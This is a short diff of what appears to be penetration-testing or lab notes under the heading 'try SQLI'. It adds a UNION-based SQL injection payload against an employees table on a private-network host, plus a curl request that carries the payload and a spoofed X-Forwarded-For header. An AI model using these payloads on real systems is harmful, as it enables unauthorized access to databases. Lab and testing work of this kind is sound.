@@ -268,6 +268,8 @@ if __name__ == "__main__":
 
 # try SQLI
 
-> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=
+> ' UNION select * from employees'
+> http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+*+from+employees%27&last_name=lastname
+> ![](image_31.png)
 
-![](image_30.png)
+curl -X GET "http://192.168.86.200/home.php?action=search&first_name=%27+UNION+select+%2A+from+employees%27&last_name=lastname" -H "X-Forwarded-For: 10.10.10.0" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
